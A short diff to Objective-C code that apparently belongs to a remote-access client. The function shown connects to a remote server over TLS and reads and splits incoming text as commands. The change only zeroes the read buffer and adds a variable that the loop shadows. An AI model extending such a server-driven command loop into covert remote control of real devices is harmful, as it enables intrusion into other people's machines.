@@ -104,6 +104,8 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     ac1d_base->client_ssl = client_ssl;
     
     char buffer[2048] = "";
+    char *terminator = buffer;
+    memset(buffer, '\0', 2048);
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
         char *terminator = (char*)[args[0] UTF8String];
